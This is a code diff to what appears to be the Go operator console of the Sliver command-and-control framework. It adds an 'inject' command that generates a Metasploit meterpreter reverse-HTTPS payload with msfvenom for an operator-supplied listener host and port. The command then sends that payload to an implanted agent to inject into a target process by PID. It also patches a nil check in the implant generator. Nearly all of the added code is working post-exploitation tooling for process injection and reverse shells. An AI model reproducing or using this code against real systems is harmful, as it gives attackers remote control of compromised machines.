@@ -54,6 +54,7 @@ var (
 		"gen":      generate,
 		"generate": generate,
 		"msf":      msf,
+		"inject":   inject,
 		"ps":       ps,
 	}
 )
@@ -234,7 +235,7 @@ func generate(term *terminal.Terminal, args []string) {
 	if err != nil {
 		fmt.Fprintf(term, Warn+"Error generating sliver: %v\n", err)
 	}
-	if *save == "" {
+	if save == nil || *save == "" {
 		fmt.Fprintf(term, Info+"Generated sliver binary at: %s\n", path)
 	} else {
 		saveTo, _ := filepath.Abs(*save)
@@ -289,6 +290,54 @@ func msf(term *terminal.Terminal, args []string) {
 		})
 		(*activeSliver).Send <- pb.Envelope{
 			Type: "task",
+			Data: data,
+		}
+		fmt.Fprintf(term, Info+"Sucessfully sent payload\n")
+	} else {
+		fmt.Fprintf(term, Warn+"Please select and active sliver via `use`\n")
+	}
+}
+
+func inject(term *terminal.Terminal, args []string) {
+	if activeSliver != nil {
+		injectFlags := flag.NewFlagSet("inject", flag.ContinueOnError)
+		injectPid := injectFlags.Int("pid", 0, "pid to inject payload into")
+		payloadName := injectFlags.String("payload", "meterpreter_reverse_https", "metasploit payload")
+		lhost := injectFlags.String("lhost", "", "metasploit listener lhost")
+		lport := injectFlags.Int("lport", 4444, "metasploit listner port")
+		injectFlags.Parse(args)
+
+		if *lhost == "" {
+			fmt.Fprintf(term, Warn+"Invalid lhost '%s', see `help msf`\n", *lhost)
+			return
+		}
+
+		fmt.Fprintf(term, Info+"Generating %s/%s -> %s:%d ...\n", activeSliver.Os, activeSliver.Arch, *lhost, *lport)
+		config := VenomConfig{
+			Os:         activeSliver.Os,
+			Arch:       MsfArch(activeSliver.Arch),
+			Payload:    *payloadName,
+			LHost:      *lhost,
+			LPort:      uint16(*lport),
+			Encoder:    "",
+			Iterations: 0, // TODO: Add support for msf encoders/encrypters
+			Encrypt:    "",
+		}
+		rawPayload, err := MsfVenomPayload(config)
+		if err != nil {
+			fmt.Fprintf(term, Warn+"Error while generating payload: %v\n", err)
+			return
+		}
+		fmt.Fprintf(term, Info+"Successfully generated payload %d byte(s)\n", len(rawPayload))
+
+		fmt.Fprintf(term, Info+"Sending payload -> %s\n", activeSliver.Name)
+		data, _ := proto.Marshal(&pb.RemoteTask{
+			Pid:     int32(*injectPid),
+			Encoder: "raw",
+			Data:    rawPayload,
+		})
+		(*activeSliver).Send <- pb.Envelope{
+			Type: "remoteTask",
 			Data: data,
 		}
 		fmt.Fprintf(term, Info+"Sucessfully sent payload\n")
